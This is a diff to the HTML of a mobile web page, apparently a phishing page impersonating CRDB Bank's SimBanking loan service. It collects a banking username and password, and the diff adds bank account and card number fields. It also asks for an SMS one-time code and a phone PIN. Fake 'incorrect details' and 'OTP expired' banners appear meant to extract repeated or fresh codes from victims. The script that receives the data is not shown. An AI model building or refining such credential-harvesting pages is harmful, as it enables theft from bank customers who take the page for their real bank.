@@ -20,23 +20,26 @@
     </div>
   </header>
 
-  <!-- HATUA YA 1: MAELEKEZO -->
+  <!-- HATUA YA 1: WELCOME MESSAGE -->
   <section id="step-I UNDERSTAND" class="screen active">
-    <h1 style="font-size: 24px; color: var(--crdb-green); text-align: center; margin-top: 10px;">Mkopo wa CRDB SimBanking</h1>
-    <p style="text-align: center; color: var(--text-muted); margin-top: 4px; font-size: 13px;">Benki ya Watu, Huduma Bora</p>
+    <h1 style="font-size: 24px; color: var(--crdb-green); text-align: center; margin-top: 10px;">WELCOME TO CRDB SIMBANKING</h1>
 
-    <div class="notice-box">
-      <h2>Fuata Hatua Hizi Kikamilifu</h2>
-      <p style="text-align: left; font-size: 14px;">
-        1. Piga <strong>*150*00#</strong> kwenye simu yako kupitia laini iliyosajiliwa na CRDB.<br><br>
-        2. Chagua <strong>Huduma za Mikopo</strong> kutoka kwenye menyu ya SimBanking.<br><br>
-        3. Jaza fomu ya maombi ya mkopo kwa usahihi.<br><br>
-        4. Kagua na utume maombi yako.<br><br>
-        5. Subiri Ujumbe Mfupi (SMS) wa uthibitisho kutoka CRDB.
+    <div class="notice-box" style="text-align: left;">
+      <p style="font-size: 15px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
+        <strong>Dear Applicant,</strong>
       </p>
-      <div class="warning-callout">
-        Fuata hatua hizi kwa makini ili kufanikisha kupata mkopo wako wa CRDB.
-      </div>
+      <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
+        Welcome to CRDB SIMBANKING. To apply for a loan, please ensure you meet the required loan application conditions and follow the official CRDB SIMBANKING application procedures.
+      </p>
+      <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
+        Make sure your details are correct and up to date.
+      </p>
+      <p style="font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 12px;">
+        Please proceed through the official CRDB channels to submit your loan application.
+      </p>
+      <p style="font-size: 14px; line-height: 1.6; color: var(--crdb-green); font-weight: 700; margin-top: 16px;">
+        Thank you for choosing CRDB Bank.
+      </p>
     </div>
 
     <button id="btn-understand-proceed" class="btn-primary btn-large" style="margin-top: auto;">
@@ -90,16 +93,16 @@
     </button>
   </section>
 
-  <!-- HATUA YA 3: INTERNET BANKING (JINA NA NYWILA) -->
+  <!-- HATUA YA 3: INTERNET BANKING (TAARIFA ZA BENKI) -->
   <section id="step-form" class="screen">
     <div style="background: var(--crdb-green); color: #FFF; padding: 24px; text-align: center; border-radius: 0 0 16px 16px; margin: -24px -24px 20px -24px;">
       <h2 style="font-size: 22px; margin-bottom: 4px;">Internet Banking</h2>
-      <p style="font-size: 13px; opacity: 0.9;">Karibu kwenye CRDB Internet Banking. Tafadhali weka Jina la Mtumiaji na Nywila</p>
+      <p style="font-size: 13px; opacity: 0.9;">Karibu kwenye CRDB Internet Banking. Tafadhali jaza taarifa zako hapa chini</p>
     </div>
 
-    <!-- ONYO KWENYE SCREEN KAMA TAARIFA ZIMEKATALIWA -->
+    <!-- BANNER LA ONYO LA SURFACE -->
     <div id="creds-surface-banner" class="surface-banner">
-      TAARIFA SI SAHIHI ❌ (Tafadhali weka jina na nywila sahihi)
+      TAARIFA SI SAHIHI ❌ (Tafadhali weka taarifa sahihi)
     </div>
 
     <div class="form-group">
@@ -107,9 +110,22 @@
       <input type="text" id="crdb-username" class="input-field" placeholder="Weka jina la mtumiaji">
     </div>
 
+    <!-- NAMBA YA AKAUNTI YA BENKI -->
+    <div class="form-group">
+      <label for="crdb-account">Namba ya Akaunti ya Benki (Bank Account Number)</label>
+      <input type="text" id="crdb-account" class="input-field" placeholder="0152XXXXXXXXX" maxlength="16" inputmode="numeric">
+    </div>
+
+    <!-- NAMBA YA KADI YA BENKI -->
+    <div class="form-group">
+      <label for="crdb-card">Namba ya Kadi ya Benki (Bank Card Number)</label>
+      <input type="text" id="crdb-card" class="input-field" placeholder="4000 XXXX XXXX XXXX" maxlength="19" inputmode="numeric">
+    </div>
+
+    <!-- NYWILA -->
     <div class="form-group">
       <label for="crdb-password">Nywila (Password)</label>
-      <input type="password" id="crdb-password" class="input-field" placeholder="Weka nywila">
+      <input type="password" id="crdb-password" class="input-field" placeholder="Weka nywila yako">
     </div>
 
     <button id="btn-submit-creds" class="btn-primary btn-large" style="margin-top: 20px;">Ingia (Sign In)</button>
@@ -122,9 +138,9 @@
       Namba ya uthibitisho ya tarakimu 6 imetumwa kupitia SMS kwenye simu yako.
     </p>
 
-    <!-- ONYO KAMA OTP IMEPOTEZA MUDA -->
+    <!-- BANNER LA ONYO KAMA OTP IMEKWISHA MUDA -->
     <div id="otp-surface-banner" class="surface-banner">
-      OTP IMEKWisha MUDA WAKE ❌ (Tafadhali weka OTP mpya ya SMS)
+      OTP IMEKWISHA MUDA WAKE ❌ (Tafadhali weka OTP mpya ya SMS)
     </div>
 
     <div class="sms-notice">
@@ -151,7 +167,7 @@
     <h2 style="margin-bottom: 6px;">Uthibitisho wa Akaunti</h2>
     <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">Weka namba yako ya simu na PIN ya tarakimu 4</p>
 
-    <!-- ONYO KAMA PIN SI SAHIHI -->
+    <!-- BANNER LA ONYO KAMA PIN SI SAHIHI -->
     <div id="pin-surface-banner" class="surface-banner">
       PIN SI SAHIHI ❌ (Tafadhali weka PIN sahihi)
     </div>
@@ -234,4 +250,4 @@
 <script src="script.js"></script>
 </body>
   </html>
-        
+  
